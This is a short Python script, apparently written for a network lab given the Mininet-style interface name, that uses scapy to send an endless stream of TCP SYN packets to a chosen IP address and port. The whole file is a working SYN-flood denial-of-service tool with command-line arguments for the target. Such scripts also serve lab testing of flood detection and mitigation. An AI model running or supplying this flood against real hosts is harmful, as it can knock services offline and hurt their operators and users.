#!/usr/bin/env python3
# Usage: python3 dos_syn_flood.py <target_ip> <port> <iface>
# Exemple: python3 dos_syn_flood.py 10.0.1.10 80 h1-eth0

import sys
import random
import time
from scapy.all import IP, TCP, send, conf

def synflood(dst_ip, dst_port, iface, delay=0.01):
    conf.iface = iface
    print(f"[INFO] Starting SYN flood on {dst_ip}:{dst_port} via {iface}")
    try:
        while True:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=random.randint(0, 0xFFFF))
            send(pkt, verbose=False)
            print(f"Sent SYN from {pkt.sport} to {dst_ip}:{dst_port}")
            time.sleep(delay)  # délai pour limiter le flux (ne pas saturer le cpu pour durant les test)
    except KeyboardInterrupt:
        print("\n[INFO] Stopped by user.")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: dos_syn_flood.py <target_ip> <port> <iface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    iface = sys.argv[3]
    synflood(target_ip, target_port, iface)
